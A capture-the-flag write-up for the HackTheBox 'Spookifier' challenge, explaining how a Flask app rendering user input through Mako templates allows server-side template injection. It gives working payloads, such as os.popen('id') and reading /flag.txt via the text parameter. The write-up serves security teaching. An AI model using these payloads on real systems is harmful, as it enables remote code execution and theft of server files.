
# **HTB – Spookifier Write-Up 

# **Challenge Description 

There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?


Difficulty = Easy
---
# Checking The Website 
![](../../assets/Pasted%20image%2020251124081353.png)

Whatever word you enter it will just give you the variation of fonts 

The problem weakness is in the server so no need to bother with the dev tools 

# **Given Files**

The challenge gives the source code.  
The important file is:

```
application/blueprints/routes.py
```

It processes the `text` parameter and calls the `spookify()` function.

---

# **Understanding the Vulnerability**

 # **1. How the app handles user input**

The route is defined like this:

```python
@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html', output=converted)
    
    return render_template('index.html', output='')
```

Whatever the user puts into `?text=` is passed straight into `spookify()` → `change_font()` → `generate_render()`.

---

##  2. `generate_render()` is the real problem

```python
def generate_render(converted_fonts):
    result = '''
<tr><td>{0}</td></tr>
<tr><td>{1}</td></tr>
<tr><td>{2}</td></tr>
<tr><td>{3}</td></tr>
'''.format(*converted_fonts)
    return Template(result).render()
```

###  what happens:

- `result` is an HTML template containing your processed input
    
- then the app calls:
    
    ```python
    Template(result).render()
    ```
    
- **Your text is now part of a Mako Template**
    
- Mako templates allow code execution using `${ ... }`
    

This is why SSTI is possible.

---

# **What is Mako and why should we care?**

**Mako** is a Python template engine (like Jinja2).  
It renders HTML but ALSO evaluates expressions inside `${ ... }`.

Example:

```
${7*7}
```

Mako will run the Python expression `7*7`.

This is exactly why the challenge is vulnerable.

**Mako docs:**  
[https://www.makotemplates.org/](https://www.makotemplates.org/)

---

#  **Confirming SSTI**


Visit:

```
http://94.237.56.175:49635/?text=${7*7}
```

If the page returns:

```
49
```

→ SSTI confirmed  
→ We can run Python commands on the server.

---

# **Getting Remote Code Execution (RCE)**

Mako exposes internal objects like `self.module.cache.util.os`, which gives us access to Python’s `os` module.

Test RCE:

```
http://94.237.56.175:49635/?text=${self.module.cache.util.os.popen('id').read()}
```

![](../../assets/Pasted%20image%2020251124081747.png)
This command explains:

- **self.module.cache.util.os** → gives access to the `os` module
    
- **os.popen('id')** → runs the Linux `id` command
    
- **read()** → prints the output on the webpage
    

You should see something like:

```
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

---

#  **Extracting the Flag**

Now that RCE works, read `/flag.txt`:

```
http://94.237.56.175:49635/?text=${self.module.cache.util.os.popen('cat /flag.txt').read()}
```

This prints the flag directly on the page.

![](../../assets/Pasted%20image%2020251124081948.png)
---

# **Final Notes**

- the fonts aren’t the vulnerability
    
- the real issue is **Mako Template rendering user input**
    
- SSTI is one of the most dangerous web vulnerabilities
    
- this challenge is a perfect intro to understanding Python template engines
    

---
